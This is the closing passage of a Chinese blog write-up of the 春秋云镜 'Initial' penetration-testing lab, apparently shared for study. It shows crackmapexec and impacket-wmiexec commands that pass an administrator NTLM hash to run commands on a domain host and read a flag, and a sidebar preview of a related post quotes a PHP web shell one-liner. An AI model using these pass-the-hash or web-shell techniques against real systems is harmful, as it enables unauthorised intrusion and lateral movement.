+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#使用 crackmapexec脚本通过smb服务执行“type Users\Administrator\flag\flag03.txt”这条命令</span><br><span class="line">proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line">#或者使用impacket-0.12.0中的wmi执行命令</span><br><span class="line">impacket-wmiexec xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> WMI全称”windows管理规范”，从win2003开始一直存在。它原本的作用是方便管理员对windows主机进行管理。</p>
+</blockquote>
+<p>获取重要文件</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/26.png"></p>
+<p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}</font></p>
+<p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p>
+<p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/27.jpeg" alt="画板"></p>
+<p><font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);"></font></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial/28.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/fdc2faba.html">https://hundredsu.github.io/post/fdc2faba.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/47d3d323.html" title="春秋云镜-Exchange"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">春秋云镜-Exchange</div></div><div class="info-2"><div class="info-item-1">参考wp： https://www.cnblogs.com/kingbridge/articles/16720318.html https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/ 开局一个ip39.99.153.253 fscan开扫 123456789101112131415161718192021222324D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 39.99.153.253┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ /...</div></div></div></a><a class="pagination-related" href="/post/8dd8445.html" title="春秋云镜-MagicRelay"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云镜-MagicRelay</div></div><div class="info-2"><div class="info-item-1">参考wp：https://www.c1trus.top/37-%E9%9D%B6%E6%9C%BAwp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/%E4%BB%BF%E7%9C%9F%E5%9C%BA%E6%99%AF/magicrelay.html 还是开局一个ip 39.99.248.17 先fscan扫 1234567891011121314151617181920212223242526D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.17   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_| ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/633b4305.html" title="春秋云镜–Aoselu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜–Aoselu</div></div><div class="info-2"><div class="info-item-1">春秋云镜–Aoselu39.98.116.223 赛后复盘重打 写的不好，且比较乱，师傅自行判断借鉴 参考了官方的wp和一些其他的师傅的类型的打法wp 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.98.116.223   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 2.0.0[*] 扫描类型: all, 目标端口:...</div></div></div></a><a class="pagination-related" href="/post/bf3976cc.html" title="cyberstrikelab-lab9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">cyberstrikelab-lab9</div></div><div class="info-2"><div class="info-item-1">信息收集开局一个ip 172.5.33.6 fscan扫一下 12345678910111213141516171819202122232425262728293031D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘     ...</div></div></div></a><a class="pagination-related" href="/post/662902bc.html" title="reddish"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">reddish</div></div><div class="info-2"><div class="info-item-1">看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打  信息收集10.10.10.94 tscan扫端口  只开放了一个端口1880 Mongo-Express Node.js 外围打点node-red-rce访问显示这个  那么我们post看一下  12345&#123;  &quot;id&quot;: &quot;ffec0b75777a00bc6e65ff2660896ad1&quot;,  &quot;ip&quot;: &quot;::ffff:10.10.16.38&quot;,  &quot;path&quot;:...</div></div></div></a><a class="pagination-related" href="/post/bdc052b9.html" title="春秋云镜-Delegation"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Delegation</div></div><div class="info-2"><div class="info-item-1">信息收集 http://39.99.128.241/ fscan直接扫  flag01 访问一下发现是cms，用poc扫一下，同时搜历史漏洞  扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）  访问admin，直接跳转 admin&#x2F;123456 直接登录成功 在模版处 修改 1&lt;?=system($_POST[a]);die();?&gt;   访问主页即可 主页会加载其他的模块内容  这里我用另一个poc 123456789101112131415POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1Host: 39.98.119.143Content-Length: 80X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...</div></div></div></a><a class="pagination-related" href="/post/38a9b672.html" title="春秋云镜-Brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Brute4road</div></div><div class="info-2"><div class="info-item-1">目标ip 信息收集 1fscan.exe -h 39.99.232.242   123456789101112131415161718192021  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4 TeamdArk5 v1.0start infoscan39.99.232.242:6379 open39.99.232.242:21 open39.99.232.242:22 open39.99.232.242:80 open[*] alive...</div></div></div></a><a class="pagination-related" href="/post/47d3d323.html" title="春秋云镜-Exchange"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Exchange</div></div><div class="info-2"><div class="info-item-1">参考wp： https://www.cnblogs.com/kingbridge/articles/16720318.html https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/ 开局一个ip39.99.153.253 fscan开扫 123456789101112131415161718192021222324D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 39.99.153.253┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ /...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/b6e82410.html" title="5、并发编程">5、并发编程</a><time datetime="2025-08-07T13:57:12.000Z" title="发表于 2025-08-07 21:57:12">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5715da98.html" title="4、函数&amp;字符串格式化&amp;条件控制&amp;结构体">4、函数&amp;字符串格式化&amp;条件控制&amp;结构体</a><time datetime="2025-08-07T13:57:10.000Z" title="发表于 2025-08-07 21:57:10">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/8b3c7b5f.html" title="3、数组与切片、指针、类型转换、字符串常用函数">3、数组与切片、指针、类型转换、字符串常用函数</a><time datetime="2025-08-07T13:57:09.000Z" title="发表于 2025-08-07 21:57:09">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3beb5b8d.html" title="2、初始函数与基本类型">2、初始函数与基本类型</a><time datetime="2025-08-07T13:57:08.000Z" title="发表于 2025-08-07 21:57:08">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/347fb1ae.html" title="1、环境配置和编辑器使用">1、环境配置和编辑器使用</a><time datetime="2025-08-07T13:57:07.000Z" title="发表于 2025-08-07 21:57:07">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
